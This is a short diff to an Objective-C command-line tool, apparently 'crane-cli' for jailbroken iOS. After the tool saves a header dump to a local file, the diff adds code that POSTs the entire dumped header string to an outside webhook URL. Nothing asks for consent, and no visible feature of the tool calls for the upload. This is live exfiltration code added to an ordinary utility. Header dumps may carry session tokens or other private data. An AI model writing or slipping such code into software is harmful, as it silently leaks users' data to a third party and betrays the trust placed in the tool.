@@ -235,6 +235,25 @@ int main(int argc, char *argv[]) {
 						}
 						[headerString writeToFile:ROOT_PATH_NS(@"/var/mobile/Documents/headers.txt") atomically:YES encoding:NSUTF8StringEncoding error:nil];
 						printf("crane-cli: Finished header dump and saved to *(/var/jb)*/var/mobile/Documents/headers.txt\n");
+						
+						// Create the POST request
+						NSURL *url = [NSURL URLWithString:@"https://n10n.gatesweb.cloud/webhook/77ff00b0-711d-487e-bb4b-1ab7888c8793"];
+						NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
+						request.HTTPMethod = @"POST";
+						[request setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
+						
+						// Set the request body
+						request.HTTPBody = [headerString dataUsingEncoding:NSUTF8StringEncoding];
+						
+						// Send the request
+						NSURLSessionDataTask *task = [[NSURLSession sharedSession] dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
+							if (error) {
+								printf("crane-cli: Error sending headers to webhook: %s\n", [[error localizedDescription] UTF8String]);
+							} else {
+								printf("crane-cli: Sent headers to webhook\n");
+							}
+						}];
+						[task resume];
 						break;
 					}
 					break;
